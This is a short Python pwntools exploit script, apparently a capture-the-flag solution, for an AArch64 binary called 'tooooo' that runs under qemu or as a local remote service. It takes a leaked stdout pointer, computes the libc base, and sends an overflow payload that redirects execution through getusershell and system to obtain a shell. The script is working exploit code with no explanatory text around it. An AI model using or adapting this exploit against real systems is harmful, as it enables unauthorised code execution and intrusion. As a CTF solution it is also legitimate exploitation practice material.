from pwn import *
import sys
context.binary = "./tooooo"
binary = './tooooo'

if sys.argv[1] == "r":
    p = remote("127.0.0.1", 1234)
elif sys.argv[1] == "l":
    p = process(["qemu-aarch64", "-L", "./", binary])
else:
    p = process(["qemu-aarch64", "-g", "1234", "-L", "./", binary])

elf = ELF("./tooooo")
libc = ELF("./lib/libc.so.6")
offset__IO_2_1_stdout_ = libc.symbols['_IO_2_1_stdout_']
print "_IO_2_1_stdout_",hex(libc.symbols['_IO_2_1_stdout_'])
print "str_bin_sh",hex(next(libc.search('/bin/sh')))

context.log_level = "debug"
addr = int(p.recvuntil('\n',drop = True)[2:],16)
libc_base = addr - offset__IO_2_1_stdout_

payload = '1'*0x20 + p64(libc_base + libc.symbols['getusershell']) + p64(libc_base + libc.symbols['system'])
p.sendline(payload)

p.interactive()
